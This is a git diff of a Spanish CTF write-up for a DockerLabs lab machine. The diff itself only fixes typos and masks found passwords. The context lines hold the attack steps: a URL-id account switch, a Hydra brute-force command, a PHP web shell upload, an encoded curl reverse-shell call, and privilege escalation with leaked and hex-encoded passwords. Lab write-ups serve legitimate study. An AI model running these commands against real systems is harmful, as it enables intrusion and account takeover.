@@ -24,7 +24,7 @@ Email[contacto@gobiernoficticio.gob], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4
 IP[172.17.0.2], JQuery, Script, Title[Gobierno Municipal]
 
 al chequear el servicio web, me consigo con un panel de login el cual permite registrarme asi que me registro
-y una vez accedo con mi user, me doy cuenta que la a travez de la url puedo cambiar de usuario
+y una vez accedo con mi user, me doy cuenta que a travez de la url puedo cambiar de usuario
 
 url: http://realgob.dl/edo_cuenta.php?id=68
 
@@ -137,7 +137,7 @@ asi que intentare aplicar un ataque de login
 
 1) capturar peticion con burpsuite de un intento de login
 
-peticion captura:
+peticion capturada:
 =================================================================================================================================
 POST /admin.php HTTP/1.1
 Host: realgob.dl
@@ -163,7 +163,7 @@ le paso los datos a hydra para realizar el ataque al panel de login
 
 hydra -l admin -P /usr/share/wordlists/rockyou.txt "realgob.dl" http-post-form "/admin.php:username=^USER^&password=^PASS^:H=Cookie: PHPSESSID=nbcdhsd6th6htftmiorj0v8c72:F=Usuario o contraseña incorrectos." -F
 
-[80][http-post-form] host: realgob.dl   login: admin   password: admin123
+[80][http-post-form] host: realgob.dl   login: admin   password: *********
 [STATUS] attack finished for realgob.dl (valid pair found)
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-20 22:26:15
@@ -174,7 +174,7 @@ al acceder al panel con las crdenciales que consegui con hydra, puedo cargar arc
 >> no se puden cargar archivos .php (intente bypassear la extesion pero sin resultados!)
 
 asi que intercepto una peticion con burpsuite al intentar cargar una imagen y envio la peticion al repeter de burpsuite
-aqui modifico la peticion captura para que me quede de la siguiente manera:
+aqui modifico la peticion capturada para que me quede de la siguiente manera:
 
 peticion ya modificada:
 
@@ -228,6 +228,7 @@ curl "http://realgob.dl/uploads/darks.php?cmd=%62%61%73%68%20%2d%63%20%22%2f%62%
 
 
 # Acceso al Sistema, User www-data 
+
 script /dev/null -c bash 
 stty raw -echo; fg
 reset xterm
@@ -329,13 +330,13 @@ index 0000000..eafd8c6
 --- /dev/null
 +++ b/remote_management_log.txt
 @@ -0,0 +1 @@
-+Acceso a Remote Management realizado por 'adm' el Mon Oct 14 07:44:17 GMT 2024. Nueva contrase<C3><B1>a: 9fR8pLt@Q2uX7dM^sW3zE5bK8nQ@7pX
++Acceso a Remote Management realizado por 'adm' el Mon Oct 14 07:44:17 GMT 2024. Nueva contrase<C3><B1>a: 9fR************7pX
 ===============================================================
 
 tenemos credenciales del user adm, asi que pivoteo de user
 
 su adm
-pass: 9fR8pLt@Q2uX7dM^sW3zE5bK8nQ@7pX
+pass: 9fR****************@7pX
 me voy al directorio del user adm y a priori no consigo nada, pero como siempre suelo chequear el .bashrc me consigo con lo siguiente
 
 export MY_PASS='64 6f 63 6b 65 72 6c 61 62 73 34 75'
@@ -343,12 +344,12 @@ export MY_PASS='64 6f 63 6b 65 72 6c 61 62 73 34 75'
 por lo visto esta codeado en hexadecimal, asi que lo convierto a ASCII en un 2x3
 
 echo '64 6f 63 6b 65 72 6c 61 62 73 34 75' |xxd -r -p
-dockerlabs4u
+do************4u
 
 y ahora si! puedo escalar a root
 
 su root
-pass: dockerlabs4u
+pass: do************4u
 whoami
 #root
 
